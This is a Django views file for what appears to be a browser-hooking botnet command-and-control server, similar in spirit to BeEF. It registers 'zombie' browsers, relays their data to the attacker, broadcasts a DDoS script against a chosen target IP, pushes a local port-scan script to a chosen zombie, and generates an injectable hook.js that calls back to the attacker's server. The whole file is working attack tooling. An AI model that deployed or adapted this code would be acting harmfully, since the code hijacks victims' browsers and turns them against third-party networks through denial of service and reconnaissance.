from django.shortcuts import render

# Create your views here.
from ws4redis.publisher import RedisPublisher
from ws4redis.redis_store import RedisMessage
from django.views.generic.base import View,TemplateResponseMixin,ContextMixin
from rest_framework import viewsets

from rest_framework.views import APIView
from rest_framework.permissions import IsAuthenticated

from .models import Zombie,Attacker
from rest_framework.response import Response
from rest_framework.decorators import list_route
import pdb
import simplejson
from django.http import HttpResponse
import os



class IndexPage(View,TemplateResponseMixin,ContextMixin):
        template_name='index.html'
        def get_context_data(self, **kwargs):
            #set up context
            context = super(IndexPage,self).get_context_data(**kwargs)
            context['zombies'] = Zombie.objects.all()
            return context
        def get(self,request):
            #create attacker sesssion and model object if doesn't exist
            if not request.session.exists(request.session.session_key):
                    request.session.create()
                    Attacker.objects.create(sesskey=request.session.session_key)
            else:
                Attacker.objects.get_or_create(sesskey=request.session.session_key)
            return self.render_to_response(self.get_context_data())



class ZombieInterface(viewsets.ModelViewSet):

    #zombie attempts to register with controller
    @list_route(methods=['get'])
    def register(self,request,pk=None):
        #pdb.set_trace()
        #check if zombie exists
        try:
            zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
        except Zombie.DoesNotExist:
            newZombie = Zombie.objects.create(host=request.META['HTTP_HOST'])
            #tell attacker new zombie added
            redis_publisher = RedisPublisher(facility='attacker',sessions=[ atkr.sesskey for atkr in Attacker.objects.all()])
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'newzombieId':newZombie.pk,'newzombieHost':newZombie.host})))
        #check if session exits
        if not request.session.exists(request.session.session_key):
            request.session.create()
        #add zombie to list
        zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
        zom.sesskey = request.session.session_key
        zom.save()

        return Response()
    #zombie updates controller with information
    @list_route(methods=['get'])
    def updateAttacker(self,request,pk=None):
        redis_publisher = RedisPublisher(facility='attacker',sessions=[ atkr.sesskey for atkr in Attacker.objects.all()])
        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'data':request.GET['data']})))

        return HttpResponse()

class Controller(viewsets.ModelViewSet):

    @list_route(methods=['post'])
    def ddos(self,request,pk=None):
        #target ip and speed of requests
        target = request.data['targetip']
        timeout = request.data['timeout']

        redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
        #fetch js
        code =None
        try:
            with open(os.getcwd()+"/ccstation/static/ddos.js","r") as f:
                code = f.read()
        except IOError as e:
            print(e)
            return HttpResponse("Failed to fetch ddos code: "+e)


        args = simplejson.dumps({'target':target,'timeout':timeout});
        # tell over Websocket zombies to attack target
        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'code': code,'args':args})))
        #ack to controller
        return Response({'ack':'ddos'})

    #cancels current attack for selected zombies
    @list_route(methods=['post'])
    def cancel(self,request,pk=None):
        #cancel for N zombies
        if 'zombies' in request.data:
            redis_publisher = RedisPublisher(facility='solo',sessions=[Zombies.objects.get(host=h).sesskey for h in request.data['zombies']])
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
        #cancel for all zombies
        else:
            redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
        #ack to controller
        return Response({'ack':'canceled'})

    #port scan
    @list_route(methods=['post'])
    def localportscan(self,request,pk=None):
        target = request.data['target']
        #fetch cell
        code =None
        try:
            with open(os.getcwd()+"/ccstation/static/portscan.js","r") as f:
                code = f.read()
        except IOError as e:
            print(e)
            return HttpResponse("Failed to fetch portscan code: "+e)
        #tell zombie to scan network
        try:
            redis_publisher = RedisPublisher(facility='solo', sessions=[Zombie.objects.get(host=target).sesskey])
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'code':code})))
        except Zombie.DoesNotExist:
            return Response({'failed':'no such zombie'})
        #ack to controller
        return Response({'ack':'portscan'})

    #creates script to inject into zombies
    @list_route(methods=['post'])
    def hookcreate(self,request,pk=None):
        ip = request.data['server_ip']
        #add ws redis
        wsredis =None
        try:
            with open(os.getcwd()+"/ccstation/static/ws4redis.min.js","r") as f:
                wsredis = f.read()
        except IOError as e:
            print(e)
            return HttpResponse("failed to setup hook script:"+e)

        #add jquery min
        jquery =None
        try:
            with open(os.getcwd()+"/ccstation/static/jquery.min.js","r") as f:
                jquery = f.read()
        except IOError as e:
            print(e)
            return HttpResponse("Failed to setup hook script: "+e)

        headers = wsredis+jquery
        #server ip
        ipstr=  'var host = "{ipaddress}";\n'
        portstr= 'var port = "{port}";'
        #get injection script
        injection = open(os.getcwd()+"/ccstation/static/protohook.js").read()
        #format for user
        injection = headers+ipstr.format(ipaddress=ip)+portstr.format(port=2000)+injection
        #attempt to create injection script
        try:
            with open(os.getcwd()+"/ccstation/static/hook.js",'w+') as f:
                    f.write(injection)
                    return HttpResponse(simplejson.dumps({'resp':"src=\"http://"+ip+":2000/static/hook.js\""}),content_type='application/json')
        except IOError as e:
            print(e)
            return HttpResponse(e)
